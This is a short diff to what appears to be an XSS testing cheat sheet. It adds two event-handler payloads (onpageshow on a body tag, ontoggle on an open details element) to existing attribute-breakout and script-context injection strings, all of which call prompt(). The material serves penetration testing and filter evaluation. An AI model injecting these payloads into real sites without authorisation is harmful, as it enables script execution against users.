@@ -18,6 +18,10 @@ Did they block onerror onload onclick? Try something like this:
 
 " onclick="prompt(1)
 
+<body onpageshow="prompt(123)"> 
+
+<details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
+
 Don't forget the injection might not be a form tag but in the javascript.
 ==============
 ";prompt(1);//
